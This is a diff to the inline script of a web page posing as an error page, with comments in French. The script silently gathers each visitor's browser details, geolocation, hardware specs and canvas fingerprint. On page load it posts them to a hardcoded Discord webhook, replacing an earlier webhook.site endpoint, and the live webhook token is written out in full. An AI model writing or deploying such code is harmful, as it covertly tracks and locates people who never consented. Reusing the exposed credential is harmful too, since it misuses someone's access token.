@@ -82,7 +82,7 @@
       online: navigator.onLine
     };
 
-    // Infos connexion (4G/5G/WiFi + vitesse)
+    // Infos connexion (wifi/4g/5g + vitesse approx)
     if (navigator.connection) {
       infos.connection = {
         type: navigator.connection.effectiveType || navigator.connection.type,
@@ -121,24 +121,51 @@
       infos.canvas = 'non supporté';
     }
 
-    // Géolocalisation
+    // Préparation du message Discord
     function showAndSend() {
+      // Affichage local pour debug
       document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);
 
-      fetch('https://webhook.site/caf96a57-b5d3-4ff3-bd88-0bd6b81d3d35', {
+      const message = {
+        embeds: [{
+          title: "Nouvelle visite détectée",
+          description: "Quelqu'un a chargé la page d'erreur",
+          color: 0xff0000,
+          fields: [
+            { name: "Heure", value: infos.timestamp, inline: true },
+            { name: "User-Agent", value: "```" + (infos.userAgent || "inconnu").substring(0, 250) + "```", inline: false },
+            { name: "Écran", value: infos.screen || "?", inline: true },
+            { name: "Fuseau horaire", value: infos.timezone || "?", inline: true },
+            { name: "Connexion", value: infos.connection ? infos.connection.type + " (" + (infos.connection.downlink || "?") + " Mbps)" : "?", inline: true },
+            { name: "Géolocalisation", value: infos.geo ? 
+              `${infos.geo.latitude}, ${infos.geo.longitude} (±${infos.geo.accuracy}m)` : 
+              "non autorisée / non disponible", inline: false },
+            { name: "Matériel", value: `Cœurs: ${infos.hardwareConcurrency || "?"} | RAM: ${infos.deviceMemory || "?"} Go`, inline: true },
+            { name: "Canvas fingerprint", value: infos.canvas ? "présent" : "absent", inline: true }
+          ],
+          footer: { text: "ID transaction : ERR-" + Date.now().toString(36).toUpperCase() },
+          timestamp: infos.timestamp
+        }]
+      };
+
+      fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(infos)
+        body: JSON.stringify(message)
       })
       .then(response => {
-        if (!response.ok) console.log('Envoi non réussi (status:', response.status, ')');
+        if (response.ok) {
+          console.log("Envoyé sur Discord");
+        } else {
+          console.error("Erreur Discord", response.status);
+        }
       })
       .catch(err => {
-        console.error('Erreur envoi:', err);
-        document.getElementById('collected').textContent += '\n\n[Erreur envoi vers webhook.site]';
+        console.error("Erreur fetch :", err);
       });
     }
 
+    // Géolocalisation
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => {
@@ -162,8 +189,8 @@
       showAndSend();
     }
 
-    // Envoi de secours au cas où les APIs prennent trop de temps
-    setTimeout(showAndSend, 5000);
+    // Envoi de secours (si géoloc prend trop de temps)
+    setTimeout(showAndSend, 6000);
   </script>
 </body>
 </html>
